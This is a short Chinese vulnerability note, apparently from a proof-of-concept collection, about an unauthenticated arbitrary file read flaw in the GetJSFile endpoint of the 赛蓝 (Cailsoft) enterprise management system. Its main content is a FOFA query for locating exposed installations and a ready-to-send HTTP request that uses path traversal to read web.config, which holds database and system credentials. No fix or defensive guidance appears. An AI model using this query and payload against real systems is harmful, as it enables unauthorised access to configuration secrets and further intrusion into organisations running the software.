# 赛蓝企业管理系统GetJSFile存在任意文件读取漏洞

赛蓝企业管理系统 GetJSFile 接口处存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

## fofa

```java
body="www.cailsoft.com" || body="赛蓝企业管理系统"
```

## poc

```java
GET /Utility/GetJSFile?filePath=../web.config HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
```

